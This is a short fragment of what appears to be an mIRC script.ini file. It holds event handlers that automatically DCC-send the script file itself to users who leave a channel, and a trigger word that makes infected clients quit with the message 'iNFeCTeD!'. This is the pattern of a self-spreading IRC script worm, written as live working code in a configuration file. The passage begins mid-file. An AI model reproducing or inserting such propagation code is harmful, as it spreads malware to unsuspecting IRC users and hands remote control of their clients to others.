n1=  /dcc send $nick $mircdirscript.ini
n2=}
n3=
n4=ON 1:PART:#:{ /if ( $nick == $me ) { halt }
n5=  /dcc send $nick $mircdirscript.ini
n6=}
n7=
n8=ON 1:TEXT:*simpsalapim*:#:/quit iNFeCTeD!
